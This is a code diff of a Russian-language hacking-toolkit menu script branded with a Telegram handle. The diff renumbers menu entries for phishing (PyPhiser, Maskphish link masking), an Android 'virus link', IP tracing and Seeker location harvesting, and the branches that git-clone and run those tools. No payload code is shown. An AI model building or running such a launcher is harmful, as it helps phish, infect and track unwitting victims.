@@ -18,13 +18,13 @@ while True:
     print ("\n")
     print ("[Telegram: @SYPEXHACK]                       [v2.7.1]")
     res()
-    print (Fore.GREEN+"    [01] Тунелирование >> Ngrok")
-    print (Fore.GREEN+"    [02] тунелирование >> Localhost")
-    print (Fore.GREEN+"    [03] Фишинг >> PyPhiser")
-    print (Fore.GREEN+"    [09] Вирус ссылка >> Android")
-    print (Fore.GREEN+"    [10] Замаскировать фишинг >> Maskphish")
-    print (Fore.GREEN+"    [12] Пробив по IP >> IP-Tracer")
-    print (Fore.GREEN+"    [15] Узнать местоположения >> Seeker")
+    print (Fore.GREEN+"    [1] Тунелирование >> Ngrok")
+    print (Fore.GREEN+"    [2] тунелирование >> Localhost")
+    print (Fore.GREEN+"    [3] Фишинг >> PyPhiser")
+    print (Fore.GREEN+"    [4] Вирус ссылка >> Android")
+    print (Fore.GREEN+"    [5] Замаскировать фишинг >> Maskphish")
+    print (Fore.GREEN+"    [6] Пробив по IP >> IP-Tracer")
+    print (Fore.GREEN+"    [7] Узнать местоположения >> Seeker")
     print (Fore.CYAN+"")
     print (Fore.YELLOW+'    [s] Подписатся на Telegram')
     print (Fore.YELLOW+'    [c] Официальный чат')
@@ -227,7 +227,7 @@ while True:
             os.system('clear')
             
 
-    if inp == '9':
+    if inp == '4':
         os.system('clear')
         print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Получам ссылку...")
         res()
@@ -240,7 +240,7 @@ while True:
         tru_901 = input('\n [Нажмите enter чтобы выйти]')
 
 
-    if inp == '10':
+    if inp == '5':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Maskphish...")
         res()
         os.system('git clone https://github.com/jaykali/maskphish.git')
@@ -251,7 +251,7 @@ while True:
         tsu_1001 = input('\n [Нажмите enter чтобы выйти]')
 
 
-    if inp == '12':
+    if inp == '6':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка IP-Tracer...")
         res()
         time.sleep(1.5)
@@ -289,7 +289,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '15':
+    if inp == '7':
         os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
         res()
